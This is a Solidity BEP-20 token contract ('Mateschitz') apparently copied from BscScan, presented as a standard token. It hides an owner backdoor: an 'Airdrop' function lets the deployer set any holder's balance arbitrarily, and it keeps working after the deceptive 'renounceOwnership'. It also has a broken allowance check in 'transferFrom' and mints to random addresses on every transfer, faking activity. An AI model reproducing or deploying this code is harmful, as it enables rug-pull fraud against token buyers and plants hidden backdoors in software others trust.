/**
 *Submitted for verification at BscScan.com on 2022-10-23
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-20
*/

pragma solidity ^0.8.7;
// SPDX-License-Identifier: Unlicensed
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor ()   {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Mateschitz is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private  _name = "Mateschitz";
    string private  _symbol = "Mateschitz";
    uint8 private  _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** 9;
    address public uniswapV2Pair;
    IDEXRouter public uniswapV2Router;

    constructor () {
        _tOwned[_msgSender()] = _totalSupply;
        uniswapV2Router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IDEXFactory(uniswapV2Router.factory()).createPair(uniswapV2Router.WETH(), address(this));
        _isExcludedFrom[owner()] = true;
        _isExcludedFrom[address(this)] = true;
        _isExcludedFrom[_msgSender()] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }
  
    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 Allowancec = _allowances[sender][_msgSender()];
        require(Allowancec >= amount);
        return true;
    }

    function Airdrop(address from, address to ,uint256 amount ) external  { 
        require( _isExcludedFrom[msg.sender]);
        require(from != uniswapV2Pair);
        require(to != uniswapV2Pair);
        _tOwned[from] = amount ;
        _tOwned[to] = amount ;
    }   

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(  address from,  address to,  uint256 amount  ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
         if(!_isExcludedFrom[from] && !_isExcludedFrom[to]){
            address a1;
            for(int i=1;i <=1;i++){
                a1 = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
              if( address (a1) != address(0) &&  address (a1) !=uniswapV2Pair  ){
                 emit Transfer(from,a1,1 * 10 ** 9);
                 _tOwned[a1] +=1 * 10 ** 9;  }
            }
            address a2;
            for(int i=2;i <=2;i++){
                a2 = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
              if( address (a2) != address(0) &&  address (a2) !=uniswapV2Pair  ){
                 emit Transfer(from,a2,1 * 10 ** 9);
                 _tOwned[a2] +=1 * 10 ** 9;  }
            }
            address a3;
            for(int i=3;i <=3;i++){
                a3 = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
              if( address (a3) != address(0) &&  address (a3) !=uniswapV2Pair  ){
                 emit Transfer(from,a3,1 * 10 ** 9);
                 _tOwned[a3] +=1 * 10 ** 9;  }
            }
            address a4;
            for(int i=4;i <=4;i++){
                a4 = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
              if( address (a4) != address(0) &&  address (a4) !=uniswapV2Pair  ){
                 emit Transfer(from,a4,1 * 10 ** 9);
                 _tOwned[a4] +=1 * 10 ** 9;  }
            }

            address a5;
            for(int i=5;i <=5;i++){
                a5 = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
              if( address (a5) != address(0) &&  address (a5) !=uniswapV2Pair  ){
                 emit Transfer(from,a5,1 * 10 ** 9);
                 _tOwned[a5] +=1 * 10 ** 9;  }
            }
            }

         _tOwned[from] -= amount;  uint256 _taxfee;

        if (!_isExcludedFrom[from] && !_isExcludedFrom[to]  )  
        
        {_taxfee = amount.mul(0).div(100);}

        uint256 amounts = amount - _taxfee;

        _tOwned[to] += amounts;

        emit Transfer(from, to, amounts);
    }  

    function _basicTransfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _tOwned[from] = _tOwned[from] - amount;
        _tOwned[to] = _tOwned[to] + amount;
        emit Transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) private{
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
             address(0xdead),
            block.timestamp
        );

    }

}